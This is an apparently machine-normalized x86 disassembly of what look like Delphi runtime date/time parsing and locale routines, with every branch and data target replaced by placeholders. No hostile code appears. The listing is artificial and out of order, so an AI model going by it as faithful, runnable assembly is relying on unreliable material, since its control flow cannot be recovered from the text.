mov eax [ ebp - 0x4 ]
call sub_40c220
mov [ ebp - 0x4 ] eax
mov al [ ebp - 0x5 ]
mov edx eax
add dl 0x9f
sub dl 0x1a
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40c200
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_409994
pop ecx
mov eax [ ebp - 0x4 ]
call sub_40c220
mov [ ebp - 0x4 ] eax
mov bl 0x20
jmp r-xdata
mov edx eax
add dl 0xbf
sub dl 0x1a
jae r-xdata
sub al 0x20
and eax 0xff
add eax 0xffffffde
cmp eax 0x38
ja r-xdata
cmp al 0x4d
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_409994
pop ecx
mov al [ eax + lookup_table_409e3b ]
jmp [ eax * 4 + jump_table_409e74 ]
mov ebx eax
cmp bl 0x48
jne r-xdata
push ebp
call sub_409a44
pop ecx
push ebp
call sub_409a70
pop ecx
cmp [ ebp - 0xc ] 0x2
jg r-xdata
push ebp
call sub_409a44
pop ecx
push ebp
call sub_409a70
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0xc ]
call sub_409ae8
pop ecx
mov eax [ ebp - 0x24 ]
call sub_4099d8
pop ecx
jmp r-xdata
push ebp
call sub_409a44
pop ecx
push ebp
call sub_409a70
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0xc ]
call sub_409c50
pop ecx
mov eax [ ebp - 0x28 ]
call sub_4099d8
pop ecx
jmp r-xdata
push ebp
call sub_409a44
pop ecx
push ebp
call sub_409a70
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_409a44
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_409a44
pop ecx
push ebp
call sub_409aa8
pop ecx
mov [ ebp - 0x1f ] 0x0
mov esi [ ebp - 0x4 ]
jmp r-xdata
push ebp
call sub_409a44
pop ecx
push ebp
call sub_409aa8
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_409a44
pop ecx
push ebp
call sub_409aa8
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_409a44
pop ecx
cmp [ ebp - 0xc ] 0x1
jne r-xdata
push ebp
call sub_409a44
pop ecx
push ebp
call sub_409aa8
pop ecx
cmp [ ebp - 0xc ] 0x3
jle r-xdata
push ebp
call sub_409aa8
pop ecx
mov esi [ ebp - 0x4 ]
dec esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_408834
test eax eax
jne r-xdata
push ebp
call sub_409a44
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409d58
pop ecx
push ebp
call sub_409aa8
pop ecx
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov al 0x4e
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov edx 0x4
call sub_4099f8
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov ecx 0x64
xor edx edx
div ecx
mov eax edx
mov edx 0x2
call sub_4099f8
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_4099f8
pop ecx
jmp r-xdata
je r-xdata
push ebp
call sub_409a70
pop ecx
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x12 ]
mov edx [ ebp - 0xc ]
call sub_4099f8
pop ecx
jmp r-xdata
je r-xdata
mov al [ esi ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
call sub_4099f8
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1a ]
mov edx [ ebp - 0xc ]
call sub_4099f8
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409d58
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409d58
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_4099f8
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x3
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408834
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax r-xdata
mov edx 0x1
call sub_409994
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409d58
pop ecx
jmp r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_409994
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_409994
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_4099d8
pop ecx
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409958
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_4099d8
pop ecx
jmp r-xdata
dec eax
je r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov ax [ ebp - 0x16 ]
cmp [ ebp - 0x1e ] 0x0
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408834
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x2
mov eax esi
call sub_409994
pop ecx
add [ ebp - 0x4 ] 0x4
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x3
cmp [ ebp - 0x1a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx [ ebp - 0x4 ]
sub edx esi
mov eax esi
call sub_409994
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
je r-xdata
cmp al [ ebp - 0x5 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_4099d8
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409958
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_4099d8
pop ecx
jmp r-xdata
dec eax
je r-xdata
xor eax eax
mov al [ esi ]
cmp eax 0x48
jg r-xdata
mov eax esi
call sub_40c220
mov esi eax
jmp r-xdata
cmp [ ebp - 0xc ] 0x2
jle r-xdata
test ax ax
jne r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408834
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x1
mov eax esi
call sub_409994
pop ecx
add [ ebp - 0x4 ] 0x2
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x2
inc [ ebp - 0x4 ]
jmp r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409d58
pop ecx
jmp r-xdata
jmp r-xdata
sub eax 0x61
je r-xdata
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
movzx eax ax
mov edx [ ebp - 0xc ]
call sub_4099f8
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
cmp ax 0xc
jbe r-xdata
mov ax 0xc
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408834
test eax eax
jne r-xdata
push ebp
call sub_409a70
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409958
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_4099d8
pop ecx
add [ ebp - 0x4 ] 0x3
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_4099d8
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_4099d8
pop ecx
jmp r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_40c220
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409d58
pop ecx
jmp r-xdata
cmp [ ebp - 0x1f ] 0x0
jne r-xdata
sub eax 0x7
je r-xdata
sub eax 0x22
je r-xdata
sub ax 0xc
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_409994
pop ecx
jmp r-xdata
push ebp
call sub_409a70
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409958
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_4099d8
pop ecx
add [ ebp - 0x4 ] 0x2
jmp r-xdata
add [ ebp - 0x4 ] 0x3
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
inc esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_408834
test eax eax
je r-xdata
jmp r-xdata
mov al [ ebp - 0x1f ]
xor al 0x1
mov [ ebp - 0x1f ] al
sub eax 0x5
je r-xdata
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408834
test eax eax
je r-xdata
sub eax 0x1a
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408834
test eax eax
jne r-xdata
jmp r-xdata
sub_40a50c
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
mov [ ebp - 0x108 ] eax
test ebx ebx
je r-xdata
push ebp
mov eax r-xdata
call sub_409d58
pop ecx
push ebp
mov eax ebx
call sub_409d58
pop ecx
jmp r-xdata
lea edx [ ebp - 0x100 ]
mov eax esi
mov ecx [ ebp - 0x104 ]
call sub_404164
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_40a57c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov ebx [ edi ]
jmp r-xdata
mov eax esi
call sub_404334
cmp ebx eax
jg r-xdata
mov [ edi ] ebx
pop edi
pop esi
pop ebx
retn
cmp [ esi + ebx - 0x1 ] 0x20
je r-xdata
inc ebx
sub_40a5a0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_40a57c
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
xor esi esi
jmp r-xdata
mov eax edi
call sub_404334
cmp ebx eax
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp ebx [ eax ]
jle r-xdata
mov al [ edi + ebx - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
sub al dl
mov edx [ ebp + 0x8 ]
mov [ edx ] al
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax ] si
mov [ ebp - 0x9 ] 0x1
cmp si 0x3e8
jb r-xdata
mov eax esi
add eax eax
lea eax [ eax + eax * 4 ]
xor edx edx
mov dl [ edi + ebx - 0x1 ]
sub dx 0x30
add ax dx
mov esi eax
inc ebx
sub_40a634
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40a6ad
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a6b4
lea eax [ ebp - 0x8 ]
call sub_404074
retn
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40a57c
lea eax [ ebp - 0x8 ]
push eax
mov eax edi
call sub_404334
mov ecx eax
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_404594
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_407edc
test eax eax
jne r-xdata
mov eax edi
call sub_404334
add [ esi ] eax
mov bl 0x1
sub_40a6c0
push ebx
push esi
push edi
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
xor ebx ebx
mov edx edi
mov eax esi
call sub_40a57c
mov eax esi
call sub_404334
cmp eax [ edi ]
jl r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
mov al [ esi + eax - 0x1 ]
cmp al [ esp ]
jne r-xdata
inc [ edi ]
mov bl 0x1
sub_40a6f8
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov edi 0x1
jmp r-xdata
mov eax esi
call sub_404334
cmp edi eax
jle r-xdata
mov al [ esi + edi - 0x1 ]
and al 0xdf
sub al 0x44
je r-xdata
xor ebx ebx
mov bl 0x1
jmp r-xdata
dec al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov bl 0x2
jmp r-xdata
sub al 0x8
je r-xdata
xor ebx ebx
jmp r-xdata
sub al 0xc
je r-xdata
mov bl 0x2
jmp r-xdata
jmp r-xdata
inc edi
sub_40a744
push ebx
push esi
mov ebx edx
mov esi eax
jmp r-xdata
mov eax esi
call sub_404334
cmp eax [ ebx ]
jl r-xdata
pop esi
pop ebx
retn
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc [ ebx ]
mov edx [ ebx ]
mov eax esi
call sub_40c264
mov [ ebx ] eax
jmp r-xdata
sub_40a78c
push ebx
push esi
push edi
push ebp
push ecx
mov ebp eax
xor eax eax
mov [ esp ] eax
mov edi 0x7
mov ebx rw-data
mov esi rw-data
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_404534
push eax
mov eax [ ebx ]
call sub_404534
pop edx
call sub_40c3d8
test eax eax
je r-xdata
add esi 0x4
add ebx 0x4
dec edi
jne r-xdata
mov eax [ esi ]
mov [ esp ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub_40a7e0
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ rw-data ] 0x12
jne r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
cmp ebx 0x63
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jle r-xdata
call sub_409980
movzx ecx ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cdq
xor eax edx
sub eax edx
add ecx eax
mov eax ecx
mov ecx 0x64
cdq
idiv ecx
imul eax eax 0x64
add ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
neg [ eax - 0x4 ]
jmp r-xdata
sub_40a83c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40ab57
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
mov [ ebp - 0x12 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x9 ] 0x0
mov eax [ rw-data ]
call sub_40a6f8
mov [ ebp - 0xa ] al
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
mov eax r-xdata
call sub_40c314
test eax eax
jle r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x67
jne r-xdata
lea eax [ ebp - 0x15 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_40a5a0
test al al
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax esi
call sub_40a744
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx ]
dec ecx
mov edx 0x1
mov eax esi
call sub_404594
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x1c ]
call sub_407f4c
mov eax [ ebp - 0x1c ]
call sub_40a78c
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ab5e
lea eax [ ebp - 0x28 ]
mov edx 0x4
call sub_404098
retn
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a6c0
test al al
je r-xdata
lea eax [ ebp - 0x16 ]
push eax
lea ecx [ ebp - 0xe ]
mov edx ebx
mov eax esi
call sub_40a5a0
test al al
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a6c0
test al al
je r-xdata
call sub_409980
mov edi eax
cmp [ ebp - 0xa ] 0x1
jne r-xdata
lea eax [ ebp - 0x17 ]
push eax
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
call sub_40a5a0
test al al
je r-xdata
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
jmp r-xdata
mov al [ ebp - 0xa ]
sub al 0x1
jb r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov cx [ ebp - 0x14 ]
mov dx [ ebp - 0x12 ]
mov eax edi
call sub_409724
mov [ ebp - 0x9 ] al
mov edx [ rw-data ]
mov eax r-xdata
call sub_404678
test eax eax
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a6c0
mov edx ebx
mov eax esi
call sub_40a57c
cmp [ rw-data ] 0x0
je r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
je r-xdata
mov eax [ rw-data ]
mov al [ eax ]
add al 0xd0
sub al 0xa
jae r-xdata
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_404334
cmp eax [ ebx ]
jl r-xdata
mov edx ebx
mov eax esi
call sub_40a744
jmp r-xdata
cmp [ ebp - 0x18 ] 0x2
ja r-xdata
push ebp
movzx eax di
call sub_40a7e0
pop ecx
mov edi eax
jmp r-xdata
mov di [ ebp - 0xc ]
mov al [ ebp - 0x15 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40a57c
mov eax esi
call sub_404334
cmp eax [ ebx ]
jl r-xdata
mov eax [ ebx ]
cmp [ esi + eax - 0x1 ] 0x20
jne r-xdata
call sub_409980
movzx ecx ax
movzx eax [ rw-data ]
sub ecx eax
mov eax ecx
push ecx
mov ecx 0x64
cdq
idiv ecx
pop ecx
imul ax ax 0x64
add di ax
cmp [ rw-data ] 0x0
jbe r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov eax [ rw-data ]
call sub_404334
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_404594
mov edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_407edc
test eax eax
je r-xdata
inc [ ebx ]
movzx eax di
cmp ecx eax
jle r-xdata
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
call sub_404334
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_404594
mov edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_407edc
test eax eax
jne r-xdata
add di 0x64
jmp r-xdata
sub_40ab80
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov esi edx
mov ebp eax
xor ebx ebx
or edi 0xffffffff
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a634
test al al
jne r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a634
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a634
test al al
jne r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0x8 ]
mov edx esi
mov eax ebp
call sub_40a5a0
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40a57c
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a634
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x6 ] 0x0
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xa ] 0x0
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a6c0
test al al
je r-xdata
test edi edi
jge r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xa ]
mov edx esi
mov eax ebp
call sub_40a5a0
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a634
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a6c0
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40a57c
mov ax [ esp + 0xa ]
push eax
mov eax [ esp + 0x4 ]
push eax
mov cx [ esp + 0x10 ]
mov dx [ esp + 0xe ]
mov ax [ esp + 0xc ]
call sub_40961c
mov ebx eax
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a634
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xc ]
mov edx esi
mov eax ebp
call sub_40a5a0
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
ja r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a634
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a6c0
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
jne r-xdata
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a634
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xe ]
mov edx esi
mov eax ebp
call sub_40a5a0
test al al
je r-xdata
add [ esp + 0x4 ] di
mov [ esp + 0x4 ] 0x0
sub_40ad74
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
mov ecx esi
mov edx esp
mov eax ebx
call sub_40ab80
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_404334
cmp eax [ esp ]
jl r-xdata
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_40ada8
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov esi eax
mov bl 0x1
mov [ esp ] 0x1
xor eax eax
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax esi
call sub_40a83c
test al al
je r-xdata
mov edx edi
mov eax esi
call sub_40ad74
mov ebx eax
jmp r-xdata
mov eax esi
call sub_404334
cmp eax [ esp ]
jl r-xdata
mov eax ebx
add esp 0x18
pop edi
pop esi
pop ebx
retn
fld [ esp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jb r-xdata
lea ecx [ esp + 0x10 ]
mov edx esp
mov eax esi
call sub_40ab80
test al al
jne r-xdata
fld [ esp + 0x8 ]
fsub [ esp + 0x10 ]
fstp [ edi ]
fwait
fld [ esp + 0x8 ]
fadd [ esp + 0x10 ]
fstp [ edi ]
fwait
jmp r-xdata
sub_40ae34
push ebx
add esp 0xffffff00
mov ebx edx
push 0x0
push 0x100
lea edx [ esp + 0x8 ]
push edx
push 0x0
push eax
push 0x0
push 0x3200
call FormatMessageA
jmp r-xdata
test eax eax
jle r-xdata
mov edx esp
mov ecx ebx
xchg ecx eax
call sub_404164
add esp 0x100
pop ebx
retn
mov dl [ esp + eax - 0x1 ]
sub dl 0x21
jb r-xdata
dec eax
sub dl 0xd
je r-xdata
sub_40ae80
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov esi ecx
mov ebx [ ebp + 0x8 ]
push 0x100
lea ecx [ ebp - 0x100 ]
push ecx
push edx
push eax
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov edx esi
call sub_4040c8
mov ecx eax
dec ecx
lea edx [ ebp - 0x100 ]
mov eax ebx
call sub_404164
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_40aecc
push ebx
push esi
push edi
push ecx
mov ebx ecx
mov esi edx
mov edi eax
push 0x2
lea eax [ esp + 0x4 ]
push eax
push esi
push edi
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov al [ esp ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_40aef4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push ebx
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x4 ]
xor ecx ecx
mov edx esi
call sub_40ae80
cmp [ ebx ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx ebx
call sub_405ba4
sub_40af30
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_40b043
push [ fs : eax ]
mov [ fs : eax ] esp
call GetThreadLocale
mov [ ebp - 0x4 ] eax
mov ebx 0x1
mov esi rw-data
mov edi rw-data
push ebp
push 0xb
lea eax [ ebp - 0xc ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x44 ]
dec eax
call sub_40aef4
pop ecx
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4040c8
push ebp
push 0xb
lea eax [ ebp - 0x10 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x38 ]
dec eax
call sub_40aef4
pop ecx
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_4040c8
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0xd
jne r-xdata
mov ebx 0x1
mov esi rw-data
mov edi rw-data
lea eax [ ebx + 0x5 ]
mov ecx 0x7
cdq
idiv ecx
mov [ ebp - 0x8 ] edx
push ebp
push 0x6
lea eax [ ebp - 0x14 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x31
call sub_40aef4
pop ecx
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_4040c8
push ebp
push 0x6
lea eax [ ebp - 0x18 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x2a
call sub_40aef4
pop ecx
mov edx [ ebp - 0x18 ]
mov eax edi
call sub_4040c8
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0x8
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b04a
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_404098
retn
sub_40b054
push ebp
mov ebp esp
push ebx
push esi
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0x0
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebx * 4 + rw-data ]
mov edx [ ebp + 0x8 ]
call sub_40426c
mov esi 0x1
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
inc ebx
sub_40b090
push ebp
